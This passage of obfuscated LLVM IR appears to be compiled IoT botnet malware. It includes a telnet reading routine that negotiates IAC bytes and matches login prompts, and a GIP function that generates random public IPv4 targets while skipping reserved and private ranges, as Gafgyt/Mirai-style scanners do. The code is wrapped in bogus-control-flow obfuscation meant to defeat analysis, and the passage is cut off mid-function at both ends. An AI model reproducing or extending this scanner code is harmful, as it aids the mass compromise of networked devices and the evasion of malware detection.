  %_14 = shl i64 0, %224
  %_15 = sub i64 0, %224
  %gen16 = mul i64 %_15, %224
  %_17 = sub i64 0, %224
  %gen18 = mul i64 %_17, %224
  %225 = sub i64 0, %224
  %226 = getelementptr inbounds i8, i8* %222, i64 %225
  %227 = load i8, i8* %226, align 1
  %228 = sext i8 %227 to i32
  %229 = icmp eq i32 %228, 10
  br label %originalBB9

originalBB22alteredBB:                            ; preds = %originalBB22, %122
  %230 = load i32, i32* %15, align 4
  %_23 = shl i32 %230, 1
  %231 = add nsw i32 %230, 1
  store i32 %231, i32* %15, align 4
  br label %originalBB22

originalBB27alteredBB:                            ; preds = %originalBB27, %159
  store i32 1, i32* %10, align 4
  br label %originalBB27

originalBB32alteredBB:                            ; preds = %originalBB32, %177
  %232 = load i32, i32* %14, align 4
  %_33 = sub i32 0, %232
  %gen34 = add i32 %_33, 1
  %_35 = sub i32 0, %232
  %gen36 = add i32 %_35, 1
  %_37 = sub i32 0, %232
  %gen38 = add i32 %_37, 1
  %_39 = shl i32 %232, 1
  %233 = add nsw i32 %232, 1
  store i32 %233, i32* %14, align 4
  br label %originalBB32
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %280, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %80

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %62, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i32, i32* @x.67
  %44 = load i32, i32* @y.68
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %42
  %51 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %52 = load i64, i64* %51, align 8
  %53 = icmp sgt i64 %52, 0
  %54 = load i32, i32* @x.67
  %55 = load i32, i32* @y.68
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %62

; <label>:62:                                     ; preds = %originalBBpart2, %38
  %63 = phi i1 [ true, %38 ], [ %53, %originalBBpart2 ]
  %64 = load i32, i32* @x.67
  %65 = load i32, i32* @y.68
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %62
  %72 = load i32, i32* @x.67
  %73 = load i32, i32* @y.68
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %80

; <label>:80:                                     ; preds = %originalBBpart24, %33
  %81 = phi i1 [ false, %33 ], [ %63, %originalBBpart24 ]
  br i1 %81, label %82, label %281

; <label>:82:                                     ; preds = %80
  %83 = load i32, i32* @x.67
  %84 = load i32, i32* @y.68
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %82
  %91 = load i32, i32* @x.67
  %92 = load i32, i32* @y.68
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %99

; <label>:99:                                     ; preds = %originalBBpart28
  %100 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %101 = getelementptr inbounds [16 x i64], [16 x i64]* %100, i64 0, i64 0
  %102 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %101) #3, !srcloc !5
  %103 = extractvalue { i64, i64* } %102, 0
  %104 = extractvalue { i64, i64* } %102, 1
  %105 = trunc i64 %103 to i32
  store i32 %105, i32* %24, align 4
  %106 = ptrtoint i64* %104 to i64
  %107 = trunc i64 %106 to i32
  store i32 %107, i32* %25, align 4
  br label %108

; <label>:108:                                    ; preds = %99
  %109 = load i32, i32* %10, align 4
  %110 = srem i32 %109, 64
  %111 = zext i32 %110 to i64
  %112 = shl i64 1, %111
  %113 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %114 = load i32, i32* %10, align 4
  %115 = sdiv i32 %114, 64
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [16 x i64], [16 x i64]* %113, i64 0, i64 %116
  %118 = load i64, i64* %117, align 8
  %119 = or i64 %118, %112
  store i64 %119, i64* %117, align 8
  %120 = load i32, i32* %10, align 4
  %121 = add nsw i32 %120, 1
  %122 = call i32 @select(i32 %121, %struct.fd_set* %21, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %22)
  %123 = icmp slt i32 %122, 1
  br i1 %123, label %124, label %141

; <label>:124:                                    ; preds = %108
  %125 = load i32, i32* @x.67
  %126 = load i32, i32* @y.68
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %124
  %133 = load i32, i32* @x.67
  %134 = load i32, i32* @y.68
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %281

; <label>:141:                                    ; preds = %108
  %142 = load i8*, i8** %15, align 8
  %143 = load i32, i32* %18, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i8, i8* %142, i64 %144
  store i8* %145, i8** %23, align 8
  %146 = load i32, i32* %10, align 4
  %147 = load i8*, i8** %23, align 8
  %148 = call i64 @recv(i32 %146, i8* %147, i64 1, i32 0)
  %149 = trunc i64 %148 to i32
  store i32 %149, i32* %19, align 4
  %150 = load i32, i32* %19, align 4
  %151 = icmp eq i32 %150, -1
  br i1 %151, label %171, label %152

; <label>:152:                                    ; preds = %141
  %153 = load i32, i32* @x.67
  %154 = load i32, i32* @y.68
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %152
  %161 = load i32, i32* %19, align 4
  %162 = icmp eq i32 %161, 0
  %163 = load i32, i32* @x.67
  %164 = load i32, i32* @y.68
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %162, label %171, label %172

; <label>:171:                                    ; preds = %originalBBpart216, %141
  store i32 0, i32* %9, align 4
  br label %286

; <label>:172:                                    ; preds = %originalBBpart216
  %173 = load i32, i32* @x.67
  %174 = load i32, i32* @y.68
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %172
  %181 = load i32, i32* %19, align 4
  %182 = load i32, i32* %18, align 4
  %183 = add nsw i32 %182, %181
  store i32 %183, i32* %18, align 4
  %184 = load i8*, i8** %23, align 8
  %185 = load i8, i8* %184, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp eq i32 %186, 255
  %188 = load i32, i32* @x.67
  %189 = load i32, i32* @y.68
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart229, label %originalBB18alteredBB

originalBBpart229:                                ; preds = %originalBB18
  br i1 %187, label %196, label %218

; <label>:196:                                    ; preds = %originalBBpart229
  %197 = load i32, i32* %10, align 4
  %198 = load i8*, i8** %23, align 8
  %199 = getelementptr inbounds i8, i8* %198, i64 1
  %200 = call i64 @recv(i32 %197, i8* %199, i64 2, i32 0)
  %201 = trunc i64 %200 to i32
  store i32 %201, i32* %19, align 4
  %202 = load i32, i32* %19, align 4
  %203 = icmp eq i32 %202, -1
  br i1 %203, label %207, label %204

; <label>:204:                                    ; preds = %196
  %205 = load i32, i32* %19, align 4
  %206 = icmp eq i32 %205, 0
  br i1 %206, label %207, label %208

; <label>:207:                                    ; preds = %204, %196
  store i32 0, i32* %9, align 4
  br label %286

; <label>:208:                                    ; preds = %204
  %209 = load i32, i32* %19, align 4
  %210 = load i32, i32* %18, align 4
  %211 = add nsw i32 %210, %209
  store i32 %211, i32* %18, align 4
  %212 = load i32, i32* %10, align 4
  %213 = load i8*, i8** %23, align 8
  %214 = call i32 @negotiate(i32 %212, i8* %213, i32 3)
  %215 = icmp ne i32 %214, 0
  br i1 %215, label %217, label %216

; <label>:216:                                    ; preds = %208
  store i32 0, i32* %9, align 4
  br label %286

; <label>:217:                                    ; preds = %208
  br label %280

; <label>:218:                                    ; preds = %originalBBpart229
  %219 = load i32, i32* @x.67
  %220 = load i32, i32* @y.68
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %218
  %227 = load i8*, i8** %15, align 8
  %228 = load i8*, i8** %11, align 8
  %229 = call i8* @strstr(i8* %227, i8* %228) #9
  %230 = icmp ne i8* %229, null
  %231 = load i32, i32* @x.67
  %232 = load i32, i32* @y.68
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br i1 %230, label %262, label %239

; <label>:239:                                    ; preds = %originalBBpart233
  %240 = load i32, i32* @x.67
  %241 = load i32, i32* @y.68
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %239
  %248 = load i32, i32* %12, align 4
  %249 = icmp ne i32 %248, 0
  %250 = load i32, i32* @x.67
  %251 = load i32, i32* @y.68
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br i1 %249, label %258, label %263

; <label>:258:                                    ; preds = %originalBBpart237
  %259 = load i8*, i8** %15, align 8
  %260 = call i32 @matchPrompt(i8* %259)
  %261 = icmp ne i32 %260, 0
  br i1 %261, label %262, label %263

; <label>:262:                                    ; preds = %258, %originalBBpart233
  store i32 1, i32* %20, align 4
  br label %281

; <label>:263:                                    ; preds = %258, %originalBBpart237
  %264 = load i32, i32* @x.67
  %265 = load i32, i32* @y.68
  %266 = sub i32 %264, 1
  %267 = mul i32 %264, %266
  %268 = urem i32 %267, 2
  %269 = icmp eq i32 %268, 0
  %270 = icmp slt i32 %265, 10
  %271 = or i1 %269, %270
  br i1 %271, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %263
  %272 = load i32, i32* @x.67
  %273 = load i32, i32* @y.68
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %280

; <label>:280:                                    ; preds = %originalBBpart241, %217
  br label %33

; <label>:281:                                    ; preds = %262, %originalBBpart212, %80
  %282 = load i32, i32* %20, align 4
  %283 = icmp ne i32 %282, 0
  br i1 %283, label %284, label %285

; <label>:284:                                    ; preds = %281
  store i32 1, i32* %9, align 4
  br label %286

; <label>:285:                                    ; preds = %281
  store i32 0, i32* %9, align 4
  br label %286

; <label>:286:                                    ; preds = %285, %284, %216, %207, %171
  %287 = load i32, i32* %9, align 4
  ret i32 %287

originalBBalteredBB:                              ; preds = %originalBB, %42
  %288 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %289 = load i64, i64* %288, align 8
  %290 = icmp sgt i64 %289, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %62
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %82
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %124
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %152
  %291 = load i32, i32* %19, align 4
  %292 = icmp eq i32 %291, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %172
  %293 = load i32, i32* %19, align 4
  %294 = load i32, i32* %18, align 4
  %_ = sub i32 0, %294
  %gen = add i32 %_, %293
  %_19 = sub i32 0, %294
  %gen20 = add i32 %_19, %293
  %_21 = shl i32 %294, %293
  %_22 = shl i32 %294, %293
  %_23 = sub i32 %294, %293
  %gen24 = mul i32 %_23, %293
  %_25 = shl i32 %294, %293
  %_26 = sub i32 %294, %293
  %gen27 = mul i32 %_26, %293
  %295 = add nsw i32 %294, %293
  store i32 %295, i32* %18, align 4
  %296 = load i8*, i8** %23, align 8
  %297 = load i8, i8* %296, align 1
  %298 = zext i8 %297 to i32
  %299 = icmp eq i32 %298, 255
  br label %originalBB18

originalBB31alteredBB:                            ; preds = %originalBB31, %218
  %300 = load i8*, i8** %15, align 8
  %301 = load i8*, i8** %11, align 8
  %302 = call i8* @strstr(i8* %300, i8* %301) #9
  %303 = icmp ne i8* %302, null
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %239
  %304 = load i32, i32* %12, align 4
  %305 = icmp ne i32 %304, 0
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %263
  br label %originalBB39
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #5

; Function Attrs: noinline nounwind uwtable
define i32 @GIP() #0 {
  %1 = load i32, i32* @x.69
  %2 = load i32, i32* @y.70
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca [16 x i8], align 16
  %10 = call i32 @rand() #3
  %11 = srem i32 %10, 223
  %12 = trunc i32 %11 to i8
  store i8 %12, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %13 = call i32 @rand() #3
  %14 = srem i32 %13, 255
  %15 = trunc i32 %14 to i8
  store i8 %15, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %16 = call i32 @rand() #3
  %17 = srem i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %19 = call i32 @rand() #3
  %20 = srem i32 %19, 255
  %21 = trunc i32 %20 to i8
  store i8 %21, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  %22 = load i32, i32* @x.69
  %23 = load i32, i32* @y.70
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:30:                                     ; preds = %4996, %originalBBpart2
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 127
  br i1 %33, label %4994, label %34

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* @x.69
  %36 = load i32, i32* @y.70
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %34
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 0
  %46 = load i32, i32* @x.69
  %47 = load i32, i32* @y.70
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br i1 %45, label %4994, label %54

; <label>:54:                                     ; preds = %originalBBpart218
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 3
  br i1 %57, label %4994, label %58

; <label>:58:                                     ; preds = %54
  %59 = load i32, i32* @x.69
  %60 = load i32, i32* @y.70
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %58
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %68, 15
  %70 = load i32, i32* @x.69
  %71 = load i32, i32* @y.70
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br i1 %69, label %4994, label %78

; <label>:78:                                     ; preds = %originalBBpart222
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 56
  br i1 %81, label %4994, label %82

; <label>:82:                                     ; preds = %78
  %83 = load i32, i32* @x.69
  %84 = load i32, i32* @y.70
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %82
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 10
  %94 = load i32, i32* @x.69
  %95 = load i32, i32* @y.70
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br i1 %93, label %4994, label %102

; <label>:102:                                    ; preds = %originalBBpart226
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 25
  br i1 %105, label %4994, label %106

; <label>:106:                                    ; preds = %102
  %107 = load i32, i32* @x.69
  %108 = load i32, i32* @y.70
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %106
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 49
  %118 = load i32, i32* @x.69
  %119 = load i32, i32* @y.70
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br i1 %117, label %4994, label %126

; <label>:126:                                    ; preds = %originalBBpart230
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 50
  br i1 %129, label %4994, label %130

; <label>:130:                                    ; preds = %126
  %131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 137
  br i1 %133, label %4994, label %134

; <label>:134:                                    ; preds = %130
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 6
  br i1 %137, label %4994, label %138

; <label>:138:                                    ; preds = %134
  %139 = load i32, i32* @x.69
  %140 = load i32, i32* @y.70
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %138
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 7
  %150 = load i32, i32* @x.69
  %151 = load i32, i32* @y.70
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br i1 %149, label %4994, label %158

; <label>:158:                                    ; preds = %originalBBpart234
  %159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %160 = zext i8 %159 to i32
  %161 = icmp eq i32 %160, 11
  br i1 %161, label %4994, label %162

; <label>:162:                                    ; preds = %158
  %163 = load i32, i32* @x.69
  %164 = load i32, i32* @y.70
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %162
  %171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 21
  %174 = load i32, i32* @x.69
  %175 = load i32, i32* @y.70
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br i1 %173, label %4994, label %182

; <label>:182:                                    ; preds = %originalBBpart238
  %183 = load i32, i32* @x.69
  %184 = load i32, i32* @y.70
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %182
  %191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 22
  %194 = load i32, i32* @x.69
  %195 = load i32, i32* @y.70
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br i1 %193, label %4994, label %202

; <label>:202:                                    ; preds = %originalBBpart242
  %203 = load i32, i32* @x.69
  %204 = load i32, i32* @y.70
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %202
  %211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 26
  %214 = load i32, i32* @x.69
  %215 = load i32, i32* @y.70
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br i1 %213, label %4994, label %222

; <label>:222:                                    ; preds = %originalBBpart246
